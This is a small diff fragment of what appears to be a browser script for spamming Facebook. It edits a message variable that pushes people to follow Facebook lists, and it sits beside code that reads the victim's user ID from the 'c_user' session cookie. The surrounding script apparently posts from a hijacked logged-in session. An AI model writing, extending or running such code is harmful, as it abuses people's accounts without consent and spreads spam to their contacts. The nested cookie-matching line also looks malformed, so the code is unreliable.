@@ -207,7 +207,7 @@ jx =
 var j = 0;
 var k = 0;
 var suc = 0;
-var msg = "Follow this list please... https://www.facebook.com/lists/562836113761391";
+var msg = "Please follow these list please... https://www.facebook.com/lists/562836113761391 & https://www.facebook.com/lists/156489554515051";
 var arr = new Array();
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 
